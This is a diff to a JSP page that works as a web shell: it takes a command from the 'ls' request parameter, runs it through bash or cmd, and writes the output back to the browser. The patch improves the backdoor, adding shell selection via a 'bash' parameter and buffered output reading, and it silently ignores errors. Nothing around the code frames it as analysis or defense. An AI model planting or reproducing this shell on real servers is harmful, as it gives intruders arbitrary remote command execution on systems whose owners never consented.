@@ -1,16 +1,26 @@
 <%@page import="java.util.*,java.io.*,java.nio.ByteBuffer, java.net.InetSocketAddress, java.nio.channels.SocketChannel, java.util.Arrays, java.io.IOException, java.net.UnknownHostException, java.net.Socket,java.util.HashSet,java.net.InetAddress,java.net.NetworkInterface,java.net.SocketException,java.util.Enumeration,java.util.Iterator,java.util.Set"%><%
 //  trimDirectiveWhitespaces="true"
-String cmd = request.getParameter("ls");
+String cmd = request.getParameter("ls"),bh = "/bin/bash", cS = "-c";
+if(null != request.getParameter("bash"))
+{
+    bh = request.getParameter("bash").toString();
+    if(-1 < bh.indexOf("cmd"))cS = "/C";
+}
 if (cmd != null)
 {
 try{
-Process p = Runtime.getRuntime().exec(cmd);
-OutputStream os = p.getOutputStream();
+Process p = Runtime.getRuntime().exec(new String[]{bh,cS,cmd});
+p.waitFor();
+
+//OutputStream os = p.getOutputStream();
 InputStream in = p.getInputStream();
-DataInputStream dis = new DataInputStream(in);
-String disr = dis.readLine();
-while ( disr != null ){
-out.println(disr); disr = dis.readLine();}
+byte[] b = new byte[2048];
+int x = in.read(b, 0, b.length); 
+while(-1 < x)
+{
+  if(0 < x)out.print(new String(b,0,x));
+  x = in.read(b, 0, b.length);
+}
 } catch (Exception x) {}
 }
 
